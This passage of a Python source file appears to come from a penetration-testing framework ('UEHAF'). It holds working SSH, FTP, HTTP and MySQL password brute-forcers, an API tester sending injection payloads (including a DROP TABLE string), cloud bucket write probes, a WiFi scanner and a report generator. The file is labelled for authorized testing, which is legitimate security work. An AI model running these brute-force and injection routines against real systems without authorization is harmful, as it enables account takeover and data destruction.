        except ImportError:
            print("[-] Paramiko not installed, skipping SSH brute force")
            return []
        
        attempts = 0
        for user in users:
            for password in passwords:
                if attempts >= max_attempts:
                    break
                
                self._rate_limit()
                attempts += 1
                
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(target, port=port, username=user, 
                                  password=password, timeout=5, 
                                  banner_timeout=5, auth_timeout=5)
                    
                    result = BruteForceResult(
                        service="SSH",
                        target=f"{target}:{port}",
                        username=user,
                        password=password,
                        success=True
                    )
                    self.results.append(result)
                    print(f"  [+] SSH SUCCESS: {user}:{password}")
                    client.close()
                    return self.results
                    
                except paramiko.AuthenticationException:
                    pass
                except Exception as e:
                    pass
                finally:
                    try:
                        client.close()
                    except:
                        pass
        
        print(f"  [-] SSH brute force completed, no valid credentials found")
        return self.results
    
    def brute_ftp(self, target: str, port: int = 21,
                  max_attempts: int = 50) -> List[BruteForceResult]:
        """FTP brute force"""
        print(f"\n[*] Starting FTP brute force on {target}:{port}")
        
        users = self._load_wordlist('users')[:5]
        passwords = self._load_wordlist('passwords')[:10]
        
        attempts = 0
        for user in users:
            for password in passwords:
                if attempts >= max_attempts:
                    break
                
                self._rate_limit()
                attempts += 1
                
                try:
                    from ftplib import FTP
                    ftp = FTP(timeout=5)
                    ftp.connect(target, port)
                    ftp.login(user, password)
                    
                    result = BruteForceResult(
                        service="FTP",
                        target=f"{target}:{port}",
                        username=user,
                        password=password,
                        success=True
                    )
                    self.results.append(result)
                    print(f"  [+] FTP SUCCESS: {user}:{password}")
                    ftp.quit()
                    return self.results
                    
                except Exception as e:
                    pass
        
        print(f"  [-] FTP brute force completed")
        return self.results
    
    def brute_http_basic(self, target: str, port: int = 80,
                         path: str = "/", max_attempts: int = 50) -> List[BruteForceResult]:
        """HTTP Basic Auth brute force"""
        print(f"\n[*] Starting HTTP Basic Auth brute force on {target}:{port}")
        
        users = self._load_wordlist('users')[:5]
        passwords = self._load_wordlist('passwords')[:10]
        
        url = f"http://{target}:{port}{path}"
        attempts = 0
        
        for user in users:
            for password in passwords:
                if attempts >= max_attempts:
                    break
                
                self._rate_limit()
                attempts += 1
                
                try:
                    response = requests.get(
                        url, 
                        auth=(user, password),
                        timeout=5
                    )
                    
                    if response.status_code == 200:
                        result = BruteForceResult(
                            service="HTTP Basic Auth",
                            target=url,
                            username=user,
                            password=password,
                            success=True
                        )
                        self.results.append(result)
                        print(f"  [+] HTTP AUTH SUCCESS: {user}:{password}")
                        return self.results
                        
                except:
                    pass
        
        print(f"  [-] HTTP brute force completed")
        return self.results
    
    def brute_mysql(self, target: str, port: int = 3306,
                    max_attempts: int = 30) -> List[BruteForceResult]:
        """MySQL brute force"""
        print(f"\n[*] Starting MySQL brute force on {target}:{port}")
        
        try:
            import pymysql
        except ImportError:
            print("[-] PyMySQL not installed, skipping MySQL brute force")
            return []
        
        users = ['root', 'admin', 'mysql', 'user']
        passwords = self._load_wordlist('passwords')[:10]
        
        attempts = 0
        for user in users:
            for password in passwords:
                if attempts >= max_attempts:
                    break
                
                self._rate_limit()
                attempts += 1
                
                try:
                    conn = pymysql.connect(
                        host=target,
                        port=port,
                        user=user,
                        password=password,
                        connect_timeout=5
                    )
                    
                    result = BruteForceResult(
                        service="MySQL",
                        target=f"{target}:{port}",
                        username=user,
                        password=password,
                        success=True
                    )
                    self.results.append(result)
                    print(f"  [+] MySQL SUCCESS: {user}:{password}")
                    conn.close()
                    return self.results
                    
                except pymysql.err.OperationalError:
                    pass
                except:
                    pass
        
        print(f"  [-] MySQL brute force completed")
        return self.results

# ============================================
# MODULE 6: API SECURITY TESTING
# ============================================

class APISecurityTester:
    """Comprehensive API security testing"""
    
    def __init__(self, config: Config = CONFIG):
        self.config = config
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': config.user_agent,
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        })
        self.endpoints: List[APIEndpoint] = []
        self.vulns: List[WebVuln] = []
    
    def _rate_limit(self):
        time.sleep(self.config.rate_limit_delay)
    
    def discover_endpoints(self, base_url: str) -> List[APIEndpoint]:
        """Discover API endpoints"""
        print(f"\n[*] Discovering API endpoints...")
        
        discovered = []
        
        # Common API paths
        for path in self.config.api_endpoints:
            try:
                self._rate_limit()
                url = urljoin(base_url, path)
                response = self.session.get(url, timeout=5)
                
                if response.status_code in [200, 401, 403]:
                    endpoint = APIEndpoint(
                        path=path,
                        method='GET',
                        params=[],
                        auth_required=response.status_code in [401, 403],
                        response_sample=response.text[:200] if response.status_code == 200 else None
                    )
                    discovered.append(endpoint)
                    print(f"  [+] Found API: {path} (HTTP {response.status_code})")
            except:
                pass
        
        # Check for OpenAPI/Swagger
        swagger_paths = ['/swagger.json', '/api-docs', '/openapi.json', '/v2/api-docs']
        for path in swagger_paths:
            try:
                url = urljoin(base_url, path)
                response = self.session.get(url, timeout=5)
                if response.status_code == 200:
                    # Parse OpenAPI spec
                    spec = response.json()
                    for api_path in spec.get('paths', {}).keys():
                        for method in spec['paths'][api_path].keys():
                            if method in ['get', 'post', 'put', 'delete', 'patch']:
                                params = [
                                    p.get('name', '') 
                                    for p in spec['paths'][api_path][method].get('parameters', [])
                                ]
                                endpoint = APIEndpoint(
                                    path=api_path,
                                    method=method.upper(),
                                    params=params,
                                    auth_required='security' in spec['paths'][api_path][method]
                                )
                                discovered.append(endpoint)
            except:
                pass
        
        self.endpoints = discovered
        return discovered
    
    def test_authentication(self, base_url: str):
        """Test API authentication"""
        print(f"\n[*] Testing API authentication...")
        
        for endpoint in self.endpoints:
            if not endpoint.auth_required:
                continue
            
            try:
                self._rate_limit()
                url = urljoin(base_url, endpoint.path)
                response = self.session.request(endpoint.method, url, timeout=5)
                
                # Check for missing auth bypass
                if response.status_code == 200:
                    self.vulns.append(WebVuln(
                        type="API Authentication Bypass",
                        severity="High",
                        url=url,
                        description=f"API endpoint accessible without authentication",
                        evidence=f"{endpoint.method} {endpoint.path} returned 200 without auth",
                        remediation="Enforce authentication on all sensitive endpoints"
                    ))
            except:
                pass
    
    def test_authorization(self, base_url: str):
        """Test horizontal/vertical privilege escalation"""
        print(f"\n[*] Testing API authorization...")
        
        # Test IDOR in API endpoints
        id_patterns = [r'\d+', r'[a-f0-9]{8}', r'[A-Z0-9]{10}']
        
        for endpoint in self.endpoints:
            for pattern in id_patterns:
                if re.search(pattern, endpoint.path):
                    # Try to access other IDs
                    test_path = re.sub(pattern, '1', endpoint.path)
                    try:
                        self._rate_limit()
                        url = urljoin(base_url, test_path)
                        response = self.session.get(url, timeout=5)
                        
                        if response.status_code == 200:
                            self.vulns.append(WebVuln(
                                type="API IDOR",
                                severity="High",
                                url=url,
                                description="Can access other users' resources via API",
                                evidence=f"Path: {test_path}",
                                remediation="Implement proper authorization checks"
                            ))
                    except:
                        pass
    
    def test_injection(self, base_url: str):
        """Test for injection vulnerabilities in APIs"""
        print(f"\n[*] Testing API injection vulnerabilities...")
        
        injection_payloads = {
            'sql': ["' OR '1'='1", "1; DROP TABLE users--"],
            'nosql': ['{"$gt": ""}', '{"$ne": null}'],
            'ldap': ['*)(uid=*))(&(uid=*', '*)(|(mail=*))'],
            'xpath': ["' or '1'='1", "' or ''='"]
        }
        
        for endpoint in self.endpoints:
            for param in endpoint.params:
                for inj_type, payloads in injection_payloads.items():
                    for payload in payloads:
                        try:
                            self._rate_limit()
                            url = urljoin(base_url, endpoint.path)
                            
                            if endpoint.method == 'GET':
                                response = self.session.get(
                                    url, 
                                    params={param: payload},
                                    timeout=5
                                )
                            else:
                                response = self.session.request(
                                    endpoint.method,
                                    url,
                                    json={param: payload},
                                    timeout=5
                                )
                            
                            # Check for error messages indicating injection
                            error_indicators = {
                                'sql': ['sql', 'mysql', 'postgresql', 'sqlite', 'ora-'],
                                'nosql': ['mongo', 'bson'],
                                'ldap': ['ldap', 'directory'],
                                'xpath': ['xpath', 'xml']
                            }
                            
                            response_text = response.text.lower()
                            if any(ind in response_text for ind in error_indicators.get(inj_type, [])):
                                self.vulns.append(WebVuln(
                                    type=f"API {inj_type.upper()} Injection",
                                    severity="Critical",
                                    url=url,
                                    description=f"Possible {inj_type} injection in API parameter",
                                    evidence=f"Parameter: {param}, Payload: {payload[:30]}",
                                    remediation="Use parameterized queries and input validation"
                                ))
                        except:
                            pass
    
    def test_rate_limiting(self, base_url: str):
        """Test for missing rate limiting"""
        print(f"\n[*] Testing API rate limiting...")
        
        if not self.endpoints:
            return
        
        endpoint = self.endpoints[0]
        url = urljoin(base_url, endpoint.path)
        
        responses = []
        for i in range(20):  # Send 20 rapid requests
            try:
                response = self.session.get(url, timeout=2)
                responses.append(response.status_code)
            except:
                pass
        
        # Check if all requests succeeded (no rate limiting)
        if len(responses) == 20 and all(r == 200 for r in responses):
            self.vulns.append(WebVuln(
                type="Missing Rate Limiting",
                severity="Medium",
                url=url,
                description="API lacks rate limiting protection",
                evidence="20 rapid requests all returned 200 OK",
                remediation="Implement rate limiting (e.g., 100 req/min per IP)"
            ))
    
    def test_mass_assignment(self, base_url: str):
        """Test for mass assignment vulnerabilities"""
        print(f"\n[*] Testing for mass assignment...")
        
        sensitive_fields = ['is_admin', 'role', 'admin', 'superuser', 
                          'password', 'id', 'created_at', 'updated_at']
        
        for endpoint in self.endpoints:
            if endpoint.method in ['POST', 'PUT', 'PATCH']:
                for field in sensitive_fields:
                    try:
                        self._rate_limit()
                        url = urljoin(base_url, endpoint.path)
                        
                        test_data = {field: True}
                        response = self.session.request(
                            endpoint.method,
                            url,
                            json=test_data,
                            timeout=5
                        )
                        
                        # If accepted, might be vulnerable
                        if response.status_code in [200, 201]:
                            self.vulns.append(WebVuln(
                                type="Potential Mass Assignment",
                                severity="High",
                                url=url,
                                description=f"API accepts sensitive field: {field}",
                                evidence=f"Field '{field}' was accepted in request",
                                remediation="Implement strong parameter filtering"
                            ))
                    except:
                        pass
    
    def scan(self, target: str) -> Tuple[List[APIEndpoint], List[WebVuln]]:
        """Run full API security scan"""
        base_url = target if target.startswith('http') else f"http://{target}"
        
        self.discover_endpoints(base_url)
        self.test_authentication(base_url)
        self.test_authorization(base_url)
        self.test_injection(base_url)
        self.test_rate_limiting(base_url)
        self.test_mass_assignment(base_url)
        
        return self.endpoints, self.vulns

# ============================================
# MODULE 7: CLOUD SECURITY SCANNER
# ============================================

class CloudSecurityScanner:
    """Multi-cloud security configuration scanner"""
    
    def __init__(self):
        self.findings: List[CloudFinding] = []
    
    def scan_aws_s3(self, bucket_name: str) -> List[CloudFinding]:
        """Scan AWS S3 bucket permissions"""
        print(f"\n[*] Scanning AWS S3: {bucket_name}")
        
        findings = []
        
        try:
            # Check if bucket is publicly listable
            response = requests.get(
                f"https://{bucket_name}.s3.amazonaws.com",
                timeout=10
            )
            
            if response.status_code == 200:
                findings.append(CloudFinding(
                    provider="AWS",
                    service="S3",
                    issue="Publicly Listable Bucket",
                    severity="High",
                    resource=bucket_name,
                    remediation="Remove ListBucket permission for Everyone"
                ))
            
            # Check for public write
            test_key = f"uehaf-test-{int(time.time())}.txt"
            test_response = requests.put(
                f"https://{bucket_name}.s3.amazonaws.com/{test_key}",
                data="test",
                timeout=10
            )
            
            if test_response.status_code == 200:
                findings.append(CloudFinding(
                    provider="AWS",
                    service="S3",
                    issue="Publicly Writable Bucket",
                    severity="Critical",
                    resource=bucket_name,
                    remediation="Remove PutObject permission for Everyone immediately"
                ))
                # Cleanup
                requests.delete(f"https://{bucket_name}.s3.amazonaws.com/{test_key}")
            
        except Exception as e:
            pass
        
        self.findings.extend(findings)
        return findings
    
    def scan_azure_blob(self, account: str, container: str) -> List[CloudFinding]:
        """Scan Azure Blob Storage"""
        print(f"\n[*] Scanning Azure Blob: {account}/{container}")
        
        findings = []
        
        try:
            url = f"https://{account}.blob.core.windows.net/{container}?restype=container&comp=list"
            response = requests.get(url, timeout=10)
            
            if response.status_code == 200:
                findings.append(CloudFinding(
                    provider="Azure",
                    service="Blob Storage",
                    issue="Publicly Accessible Container",
                    severity="High",
                    resource=f"{account}/{container}",
                    remediation="Set container access level to Private"
                ))
        except:
            pass
        
        self.findings.extend(findings)
        return findings
    
    def scan_gcp_storage(self, bucket: str) -> List[CloudFinding]:
        """Scan Google Cloud Storage"""
        print(f"\n[*] Scanning GCS: {bucket}")
        
        findings = []
        
        try:
            url = f"https://storage.googleapis.com/{bucket}"
            response = requests.get(url, timeout=10)
            
            if response.status_code == 200:
                findings.append(CloudFinding(
                    provider="GCP",
                    service="Cloud Storage",
                    issue="Publicly Accessible Bucket",
                    severity="High",
                    resource=bucket,
                    remediation="Remove allUsers access from bucket IAM"
                ))
        except:
            pass
        
        self.findings.extend(findings)
        return findings
    
    def scan_cloudfront(self, domain: str) -> List[CloudFinding]:
        """Check CloudFront/CDN misconfigurations"""
        findings = []
        
        try:
            # Check for origin access
            response = requests.get(f"https://{domain}", timeout=10)
            
            # Check if S3 origin is directly accessible
            if 'x-amz-request-id' in response.headers:
                findings.append(CloudFinding(
                    provider="AWS",
                    service="CloudFront",
                    issue="S3 Origin Headers Exposed",
                    severity="Low",
                    resource=domain,
                    remediation="Configure CloudFront to not forward S3 headers"
                ))
        except:
            pass
        
        self.findings.extend(findings)
        return findings
    
    def scan_docker_registry(self, registry_url: str) -> List[CloudFinding]:
        """Scan Docker registry for public access"""
        findings = []
        
        try:
            # Check v2 API
            response = requests.get(
                f"{registry_url}/v2/_catalog",
                timeout=10
            )
            
            if response.status_code == 200:
                findings.append(CloudFinding(
                    provider="Generic",
                    service="Docker Registry",
                    issue="Publicly Accessible Registry",
                    severity="Critical",
                    resource=registry_url,
                    remediation="Enable authentication on Docker registry"
                ))
        except:
            pass
        
        self.findings.extend(findings)
        return findings
    
    def scan_kubernetes(self, api_server: str) -> List[CloudFinding]:
        """Scan Kubernetes API server"""
        findings = []
        
        try:
            # Check for unauthenticated access
            endpoints = ['/api', '/api/v1', '/apis', '/version']
            
            for endpoint in endpoints:
                response = requests.get(
                    f"{api_server}{endpoint}",
                    timeout=5,
                    verify=False
                )
                
                if response.status_code == 200:
                    findings.append(CloudFinding(
                        provider="Kubernetes",
                        service="API Server",
                        issue=f"Unauthenticated Access to {endpoint}",
                        severity="Critical",
                        resource=api_server,
                        remediation="Enable authentication and authorization on API server"
                    ))
        except:
            pass
        
        self.findings.extend(findings)
        return findings

# ============================================
# MODULE 8: WIRELESS NETWORK AUDITING
# ============================================

class WirelessAuditor:
    """Wireless network security auditing"""
    
    def __init__(self):
        self.networks: List[WirelessNetwork] = []
    
    def scan_wifi(self, interface: str = "wlan0") -> List[WirelessNetwork]:
        """Scan for wireless networks"""
        print(f"\n[*] Scanning for wireless networks on {interface}...")
        
        networks = []
        
        try:
            # Use iwlist or airodump-ng if available
            result = subprocess.run(
                ['iwlist', interface, 'scan'],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            # Parse output
            cells = result.stdout.split('Cell ')
            
            for cell in cells[1:]:
                network = self._parse_iwlist_cell(cell)
                if network:
                    networks.append(network)
                    print(f"  [+] Found: {network.ssid} ({network.encryption})")
        
        except FileNotFoundError:
            print("[-] iwlist not found, trying alternative method...")
            try:
                # Try nmcli
                result = subprocess.run(
                    ['nmcli', 'dev', 'wifi', 'list'],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                # Parse nmcli output
                for line in result.stdout.split('\n')[1:]:
                    if line.strip():
                        parts = line.split()
                        if len(parts) >= 8:
                            networks.append(WirelessNetwork(
                                bssid=parts[0],
                                ssid=parts[-1],
                                channel=int(parts[4]) if parts[4].isdigit() else 0,
                                encryption=parts[6],
                                signal=int(parts[7].replace('%', ''))
                            ))
            except:
                print("[-] No wireless scanning tools available")
        
        self.networks = networks
        return networks
    
    def _parse_iwlist_cell(self, cell: str) -> Optional[WirelessNetwork]:
        """Parse iwlist cell output"""
        try:
            bssid = re.search(r'Address: ([0-9A-F:]{17})', cell)
            ssid = re.search(r'ESSID:"([^"]*)"', cell)
            channel = re.search(r'Channel:(\d+)', cell)
            encryption = re.search(r'Encryption key:(on|off)', cell)
            
            # Determine encryption type
            enc_type = "Open"
            if encryption and encryption.group(1) == "on":
                if "WPA2" in cell:
                    enc_type = "WPA2"
                elif "WPA" in cell:
                    enc_type = "WPA"
                elif "WEP" in cell:
                    enc_type = "WEP"
                else:
                    enc_type = "Unknown"
            
            # Check for WPS
            wps = "WPS" in cell
            
            vulnerabilities = []
            if enc_type == "WEP":
                vulnerabilities.append("WEP is cryptographically broken")
            if enc_type == "Open":
                vulnerabilities.append("No encryption - traffic visible to all")
            if wps:
                vulnerabilities.append("WPS enabled - vulnerable to PIN brute force")
            
            return WirelessNetwork(
                bssid=bssid.group(1) if bssid else "Unknown",
                ssid=ssid.group(1) if ssid else "Hidden",
                channel=int(channel.group(1)) if channel else 0,
                encryption=enc_type,
                signal=0,  # Would need to parse from Quality line
                vulnerabilities=vulnerabilities
            )
        except:
            return None
    
    def check_wps_vulnerability(self, bssid: str, interface: str = "wlan0") -> bool:
        """Check if WPS is vulnerable"""
        print(f"\n[*] Checking WPS vulnerability for {bssid}...")
        
        try:
            # Use reaver or wash if available
            result = subprocess.run(
                ['wash', '-i', interface, '-c', '1'],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if bssid.replace(':', '').lower() in result.stdout.lower():
                return True
        except FileNotFoundError:
            pass
        
        return False
    
    def generate_wifi_report(self) -> Dict:
        """Generate WiFi security report"""
        report = {
            'total_networks': len(self.networks),
            'open_networks': len([n for n in self.networks if n.encryption == "Open"]),
            'wep_networks': len([n for n in self.networks if n.encryption == "WEP"]),
            'wpa_networks': len([n for n in self.networks if n.encryption == "WPA"]),
            'wpa2_networks': len([n for n in self.networks if n.encryption == "WPA2"]),
            'vulnerable_networks': []
        }
        
        for network in self.networks:
            if network.vulnerabilities:
                report['vulnerable_networks'].append({
                    'ssid': network.ssid,
                    'bssid': network.bssid,
                    'issues': network.vulnerabilities
                })
        
        return report

# ============================================
# MODULE 9: REPORT GENERATOR (ENHANCED)
# ============================================

class ReportGenerator:
    """Generate comprehensive security reports"""
    
    def __init__(self, output_dir: str = "./scan_results"):
        self.output_dir = output_dir
        import os
        os.makedirs(output_dir, exist_ok=True)
    
    def generate_json(self, results: List[HostResult], filename: str):
        """Generate JSON report"""
        data = []
        for r in results:
            data.append({
                'ip': r.ip,
                'hostname': r.hostname,
                'os_guess': r.os_guess,
                'ports': [asdict(p) for p in r.ports],
                'web_vulnerabilities': [asdict(v) for v in r.web_vulns],
                'api_endpoints': [asdict(e) for e in r.api_endpoints],
                'exploits': [asdict(e) for e in r.exploits],
                'brute_force_results': [asdict(b) for b in r.brute_results],
                'cloud_findings': [asdict(c) for c in r.cloud_findings],
                'ssl_info': r.ssl_info
            })
        
        filepath = f"{self.output_dir}/{filename}.json"
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)
        print(f"[+] JSON report: {filepath}")
        return filepath
    
    def generate_html(self, results: List[HostResult], filename: str):
        """Generate professional HTML report"""
        severity_colors = {
            'Critical': '#ff0000',
            'High': '#ff6600',
            'Medium': '#ffaa00',
            'Low': '#00aa00',
            'Info': '#0088ff'
        }
        
        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UEHAF Security Assessment Report</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #e0e0e0;
            line-height: 1.6;
        }}
        .container {{ max-width: 1400px; margin: 0 auto; padding: 20px; }}
        header {{ 
            text-align: center; 
            padding: 40px 20px;
            background: rgba(0,0,0,0.3);
            border-radius: 15px;
            margin-bottom: 30px;
        }}
        h1 {{ color: #00d4aa; font-size: 2.5em; margin-bottom: 10px; }}
        .timestamp {{ color: #888; }}
        .summary-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }}
        .summary-card {{
            background: rgba(0,0,0,0.4);
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            border-left: 4px solid #00d4aa;
        }}
        .summary-card h3 {{ color: #00d4aa; font-size: 2em; }}
        .host-section {{
            background: rgba(0,0,0,0.3);
            margin-bottom: 30px;
            border-radius: 15px;
            overflow: hidden;
        }}
        .host-header {{
            background: linear-gradient(90deg, #0f3460 0%, #16213e 100%);
            padding: 20px;
            border-bottom: 2px solid #00d4aa;
        }}
        .host-header h2 {{ color: #00d4aa; }}
        .host-content {{ padding: 20px; }}
        table {{
            width: 100%;
            border-collapse: collapse;
            margin: 15px 0;
            background: rgba(0,0,0,0.2);
            border-radius: 8px;
            overflow: hidden;
        }}
        th, td {{ padding: 12px 15px; text-align: left; border-bottom: 1px solid #333; }}
        th {{ 
            background: linear-gradient(90deg, #0f3460 0%, #1a4a7a 100%);
            color: #fff;
            font-weight: 600;
        }}
        tr:hover {{ background: rgba(255,255,255,0.05); }}
        .severity {{
            padding: 4px 12px;
            border-radius: 20px;
            font-weight: bold;
            font-size: 0.85em;
            display: inline-block;
        }}
        .severity-critical {{ background: #ff0000; color: white; }}
        .severity-high {{ background: #ff6600; color: white; }}
        .severity-medium {{ background: #ffaa00; color: black; }}
        .severity-low {{ background: #00aa00; color: white; }}
        .severity-info {{ background: #0088ff; color: white; }}
        .vuln-type {{ color: #ff6b6b; font-weight: 600; }}
        .section-title {{
            color: #00d4aa;
            margin: 25px 0 15px;
            padding-bottom: 10px;
            border-bottom: 2px solid #0f3460;
        }}
        .evidence {{
            background: rgba(0,0,0,0.3);
            padding: 10px;
            border-radius: 5px;
            font-family: monospace;
            font-size: 0.9em;
            color: #aaa;
            margin-top: 5px;
        }}
        .remediation {{
            background: rgba(0,212,170,0.1);
            border-left: 3px solid #00d4aa;
            padding: 10px;
            margin-top: 10px;
            border-radius: 0 5px 5px 0;
        }}
        .success {{ color: #00ff00; }}
        .failed {{ color: #ff0000; }}
        footer {{
            text-align: center;
            padding: 20px;
            color: #666;
            border-top: 1px solid #333;
            margin-top: 40px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🔒 Ultimate Ethical Hacking Assessment Report</h1>
            <p class="timestamp">Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </header>
        
        <div class="summary-grid">
            <div class="summary-card">
                <h3>{len(results)}</h3>
                <p>Hosts Scanned</p>
            </div>
            <div class="summary-card">
                <h3>{sum(len(r.ports) for r in results)}</h3>
                <p>Open Ports</p>
            </div>
            <div class="summary-card">
                <h3>{sum(len(r.web_vulns) for r in results)}</h3>
                <p>Vulnerabilities</p>
            </div>
            <div class="summary-card">
                <h3>{sum(len(r.exploits) for r in results)}</h3>
                <p>Exploit Checks</p>
            </div>
        </div>
"""
        
        for host in results:
            critical = len([v for v in host.web_vulns if v.severity == 'Critical'])
            high = len([v for v in host.web_vulns if v.severity == 'High'])
            
            html += f"""
        <div class="host-section">
            <div class="host-header">
                <h2>🖥️ {host.ip} {f'({host.hostname})' if host.hostname else ''}</h2>
                <p>OS Guess: {host.os_guess or 'Unknown'} | 
                   Critical: {critical} | High: {high}</p>
            </div>
            <div class="host-content">
"""
            
            # Open Ports
            if host.ports:
                html += """
                <h3 class="section-title">🔌 Open Ports</h3>
                <table>
                    <tr>
                        <th>Port</th>
                        <th>Service</th>
                        <th>Version</th>
                        <th>State</th>
                        <th>Banner</th>
                    </tr>
"""
                for port in host.ports:
                    html += f"""
                    <tr>
                        <td><strong>{port.port}</strong></td>
                        <td>{port.service}</td>
                        <td>{port.version or 'Unknown'}</td>
                        <td>{port.state}</td>
                        <td><code>{(port.banner or 'N/A')[:100]}</code></td>
                    </tr>"""
                html += "</table>"
            
            # Vulnerabilities
            if host.web_vulns:
                html += """
                <h3 class="section-title">⚠️ Vulnerabilities</h3>
                <table>
                    <tr>
                        <th>Severity</th>
                        <th>Type</th>
                        <th>URL</th>
                        <th>Details</th>
                    </tr>
"""
                for vuln in host.web_vulns:
                    sev_class = f"severity-{vuln.severity.lower()}"
                    html += f"""
                    <tr>
                        <td><span class="severity {sev_class}">{vuln.severity}</span></td>
                        <td class="vuln-type">{vuln.type}</td>
                        <td><code>{vuln.url[:60]}...</code></td>
                        <td>
                            <p>{vuln.description}</p>
                            {f'<div class="evidence">Evidence: {vuln.evidence[:150]}</div>' if vuln.evidence else ''}
                            {f'<div class="remediation"><strong>Fix:</strong> {vuln.remediation}</div>' if vuln.remediation else ''}
                        </td>
                    </tr>"""
                html += "</table>"
            
            # API Endpoints
            if host.api_endpoints:
                html += """
                <h3 class="section-title">🔌 API Endpoints</h3>
                <table>
                    <tr>
                        <th>Method</th>
                        <th>Path</th>
                        <th>Auth Required</th>
                        <th>Parameters</th>
                    </tr>
"""
                for endpoint in host.api_endpoints:
                    html += f"""
                    <tr>
                        <td><span class="severity severity-info">{endpoint.method}</span></td>
                        <td>{endpoint.path}</td>
                        <td>{'Yes' if endpoint.auth_required else 'No'}</td>
                        <td>{', '.join(endpoint.params) or 'None'}</td>
                    </tr>"""
                html += "</table>"
            
            # Exploits
            if host.exploits:
                html += """
                <h3 class="section-title">💥 Exploit Checks</h3>
                <table>
                    <tr>
                        <th>CVE/Exploit</th>
                        <th>Target</th>
                        <th>Status</th>
                        <th>Output</th>
                    </tr>
"""
                for exploit in host.exploits:
                    status_class = "success" if exploit.success else "failed"
                    status_text = "VULNERABLE" if exploit.success else "Not Vulnerable"
                    html += f"""
                    <tr>
                        <td>{exploit.name}</td>
                        <td>{exploit.target}</td>
                        <td class="{status_class}">{status_text}</td>
                        <td>{exploit.output}</td>
                    </tr>"""
                html += "</table>"
            
            # Brute Force Results
            if host.brute_results:
                html += """
                <h3 class="section-title">🔑 Credential Testing</h3>
                <table>
                    <tr>
                        <th>Service</th>
                        <th>Username</th>
                        <th>Status</th>
                    </tr>
"""
                for brute in host.brute_results:
                    status_class = "success" if brute.success else "failed"
                    status_text = "VALID" if brute.success else "Failed"
                    html += f"""
                    <tr>
                        <td>{brute.service}</td>
                        <td>{brute.username}</td>
                        <td class="{status_class}">{status_text}</td>
                    </tr>"""
                html += "</table>"
            
            # Cloud Findings
            if host.cloud_findings:
                html += """
                <h3 class="section-title">☁️ Cloud Security Findings</h3>
                <table>
                    <tr>
                        <th>Provider</th>
                        <th>Service</th>
                        <th>Issue</th>
                        <th>Severity</th>
                    </tr>
"""
                for finding in host.cloud_findings:
                    sev_class = f"severity-{finding.severity.lower()}"
                    html += f"""
                    <tr>
                        <td>{finding.provider}</td>
                        <td>{finding.service}</td>
                        <td>{finding.issue}</td>
                        <td><span class="severity {sev_class}">{finding.severity}</span></td>
                    </tr>"""
                html += "</table>"
            
            html += """
            </div>
        </div>
"""
        
        html += """
        <footer>
            <p>Generated by Ultimate Ethical Hacking Automation Framework (UEHAF) v2.0</p>
            <p>For authorized security testing only</p>
        </footer>
    </div>
</body>
</html>"""
        
        filepath = f"{self.output_dir}/{filename}.html"
        with open(filepath, 'w') as f:
            f.write(html)
        print(f"[+] HTML report: {filepath}")
        return filepath
    
    def generate_pdf(self, results: List[HostResult], filename: str):
        """Generate PDF report (requires reportlab)"""
        try:
            from reportlab.lib import colors
            from reportlab.lib.pagesizes import letter
            from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph, Spacer
            from reportlab.lib.styles import getSampleStyleSheet
            
            filepath = f"{self.output_dir}/{filename}.pdf"
            doc = SimpleDocTemplate(filepath, pagesize=letter)
            elements = []
            styles = getSampleStyleSheet()
            
            # Title
            elements.append(Paragraph("UEHAF Security Assessment Report", styles['Title']))
            elements.append(Spacer(1, 20))
            
            # Summary
            elements.append(Paragraph(f"Hosts Scanned: {len(results)}", styles['Normal']))
            elements.append(Spacer(1, 12))
            
            doc.build(elements)
            print(f"[+] PDF report: {filepath}")
            return filepath
        except ImportError:
            print("[-] reportlab not installed, skipping PDF generation")
            return None

# ============================================
# MAIN ORCHESTRATOR
# ============================================

class UEHAF:
    """Ultimate Ethical Hacking Automation Framework"""
    
    def __init__(self):
        self.recon = ReconModule()
        self.port_scanner = PortScanner()
        self.web_scanner = WebScanner()
        self.exploit_framework = ExploitFramework()
        self.brute_module = BruteForceModule()
        self.api_tester = APISecurityTester()
        self.cloud_scanner = CloudSecurityScanner()
        self.wireless_auditor = WirelessAuditor()
        self.reporter = ReportGenerator()
        self.results: List[HostResult] = []
    
    def scan_target(self, target: str, options: Dict = None) -> HostResult:
        """Perform comprehensive scan on a single target"""
        options = options or {}
        
        print(f"\n{'='*70}")
        print(f"[*] ULTIMATE SCAN: {target}")
        print(f"{'='*70}")
        
        # Resolve and basic recon
        ip, hostname = self.recon.resolve_hostname(target)
        print(f"[+] Resolved: {ip} {f'({hostname})' if hostname else ''}")
        
        os_guess = self.recon.os_fingerprint(ip)
        if os_guess:
            print(f"[+] OS Guess: {os_guess}")
        
        # Port scan
        print(f"\n[*] Phase 1: Port Scanning")
        ports = self.port_scanner.scan(ip)
        
        # Web vulnerability scan
        print(f"\n[*] Phase 2: Web Application Security")
        web_vulns, ssl_info = self.web_scanner.scan(target)
        
        # API testing
        print(f"\n[*] Phase 3: API Security Testing")
        api_endpoints, api_vulns = self.api_tester.scan(target)
        web_vulns.extend(api_vulns)
        
        # Exploit checking
        print(f"\n[*] Phase 4: Vulnerability Verification")
        exploits = self.exploit_framework.check_vulnerabilities(ip, ports)
        
        # Brute force (if enabled)
        brute_results = []
        if options.get('enable_brute', False):
            print(f"\n[*] Phase 5: Credential Testing")
            # Only brute force specific services
            for port in ports:
                if port.port == 22 and port.state == "open":
